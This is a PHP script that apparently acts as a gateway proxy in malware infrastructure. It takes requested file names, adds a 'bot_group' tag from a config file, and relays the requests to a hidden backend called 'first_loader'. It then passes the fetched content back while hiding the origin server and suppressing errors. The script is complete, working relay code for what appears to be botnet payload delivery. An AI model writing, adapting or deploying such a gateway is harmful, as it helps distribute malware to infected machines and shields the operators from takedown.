<?php 


date_default_timezone_set('europe/moscow');


ini_set('display_errors',0);
ini_set('display_startup_errors',0);
error_reporting(0);	

/* for debug
ini_set('display_errors',1);
ini_set('display_startup_errors',1);
error_reporting(E_ALL);
*/


$target_host = "x.x.x.x";
$target_port = "80";
$target_uri = "first_loader/first_loader.php";
$log_file = dirname(__FILE__)."/proxy_log.txt";

$debug = 0;
$debug_msg = "";

$save_log = "";

$client_ip = $_SERVER['REMOTE_ADDR'];
if (isset($_SERVER['HTTP_X_REAL_IP'])) {
	$client_ip = $_SERVER['HTTP_X_REAL_IP'];
} else if (isset($_SERVER['HTTP_CF_CONNECTING_IP'])) {
	$client_ip = $_SERVER['HTTP_CF_CONNECTING_IP'];
}

if (isset($_SERVER["REQUEST_URI"])) {
	if (preg_match('/\/([^\/]+\.[^?&]+)/i', $_SERVER["REQUEST_URI"], $match)) {
		if (function_exists('opcache_invalidate')) { 
			opcache_invalidate("conf.php");
		}
		include("conf.php");
		
		$target_uri = "$target_uri?fname=".$match[1];
		
		if (isset($_SERVER['QUERY_STRING']) && strlen($_SERVER['QUERY_STRING']) > 0) {
			if (!isset($_GET["bg"])) {
				$target_uri .= "&bg=$bot_group";
			}
			$target_uri .= "&".$_SERVER['QUERY_STRING'];
		} else {
			$target_uri .= "&bg=$bot_group";
		}
	} else {
		print "REQUEST ERROR 1<br>REQUEST_URI='".$_SERVER["REQUEST_URI"]."'<br>\n";
		exit(0);
	}
} else {
	print '$_SERVER[REQUEST_URI] not found <br>\n';
	exit(0);
}

if (!function_exists('getallheaders')) { 
    function getallheaders()
	{ 
       $headers = array (); 
       foreach ($_SERVER as $name => $value) { 
           if (substr($name, 0, 5) == 'HTTP_') { 
               $headers[str_replace(' ', '-', ucwords(strtolower(str_replace('_', ' ', substr($name, 5)))))] = $value; 
           } 
       } 
       return $headers;
    }
}


// $target_url = "https://$target_host:$target_port/$target_uri";
$target_url = "http://$target_host:$target_port/$target_uri";
print_dbg("=== method=".$_SERVER['REQUEST_METHOD']." ip='".$_SERVER['REMOTE_ADDR']."' REQUEST_URI='".$_SERVER["REQUEST_URI"]."' target_url='$target_url' QUERY_STRING=".$_SERVER['QUERY_STRING']."\n");


#if (isset($_SERVER['QUERY_STRING']) && strlen($_SERVER['QUERY_STRING']) > 0) {
#	$target_url .= "?".$_SERVER['QUERY_STRING'];
#}


$headers =  getallheaders();
#foreach($headers as $key=>$val){
#  print_dbg('===>>> '.$key .': '.$val);
#}

$headers = array(
	"Host: $target_host",
	"X-Forwarded-For-Client: ".$client_ip,
	"X-Forwarded-For-Gateway: ".$_SERVER['HTTP_HOST']
);
if (isset($_SERVER["HTTP_USER_AGENT"])) {
	array_push($headers, "User-Agent: ".$_SERVER["HTTP_USER_AGENT"]);
}
if (isset($_SERVER["HTTP_RANGE"])) {
	array_push($headers, "Range: ".$_SERVER["HTTP_RANGE"]);
}
if (isset($_SERVER["HTTP_IF_UNMODIFIED_SINCE"])) {
	array_push($headers, "If-Unmodified-Since: ".$_SERVER["HTTP_IF_UNMODIFIED_SINCE"]);
}

/*
if (isset($_SERVER["HTTP_PROXY_CONNECTION"])) {
	array_push($headers, "Proxy-Connection: ".$_SERVER["HTTP_PROXY_CONNECTION"]);
}
if (isset($_SERVER["HTTP_X_FORWARDED_FOR"])) {
	array_push($headers, "X-Forwarded-For: ".$_SERVER["HTTP_X_FORWARDED_FOR"]);
}
*/

$resp_headers = array();
$curl = curl_init();
if ($_SERVER['REQUEST_METHOD'] == "HEAD") {
	curl_setopt($curl, CURLOPT_NOBODY, true);
}
curl_setopt($curl, CURLOPT_URL, "$target_url");
curl_setopt($curl, CURLOPT_HTTPHEADER, $headers);
curl_setopt($curl, CURLOPT_HEADER, 0);
curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
curl_setopt($curl, CURLOPT_FAILONERROR,true);
curl_setopt($curl, CURLOPT_HEADERFUNCTION, "HandleHeaderLine");
$content = curl_exec($curl);
if(curl_error($curl))
{
	$err_code = curl_error($curl);	
	print_dbg("GET error: $err_code");
	$http_status = curl_getinfo($curl, CURLINFO_HTTP_CODE);
	if ($http_status) {
		print_dbg("HTTP CODE: $http_status");
	}
	curl_close($curl);
	return;
}
$http_status = curl_getinfo($curl, CURLINFO_HTTP_CODE);


// Set some response headers
//
foreach ($resp_headers as $h) {
	header($h);
}

if (isset($_SERVER["HTTP_PROXY_CONNECTION"])) {
	header("Proxy-Connection: ".$_SERVER["HTTP_PROXY_CONNECTION"]);
}
if (isset($_SERVER["HTTP_X_FORWARDED_FOR"])) {
	header("X-Forwarded-For: ".$_SERVER["HTTP_X_FORWARDED_FOR"]);
}


print $content;

function HandleHeaderLine($curl, $header_line)
{
	global $resp_headers;
	
	array_push($resp_headers, $header_line);
	
/*	
	$needed_headers = array("Content-Type", "Content-Length", "Accept-Ranges", "Content-Range", "HTTP/1", "Last-Modified", "Content-Disposition");
	
	print_dbg("response header: $header_line");
	foreach ($needed_headers as $h) {
		if (substr_compare($header_line, $h, 0, strlen($h)) === 0) {
			print_dbg("Good header! $header_line");
			array_push($resp_headers, $header_line);
		}
	}
*/	
    return strlen($header_line);
} 

function print_dbg($msg)
{
	global $log_file, $debug;
	
	if ($debug > 0) {
		file_put_contents($log_file, "[".date("H:i:s d/m/Y")."]\t".rtrim($msg)."\n", FILE_APPEND | LOCK_EX);
	}
}

?>
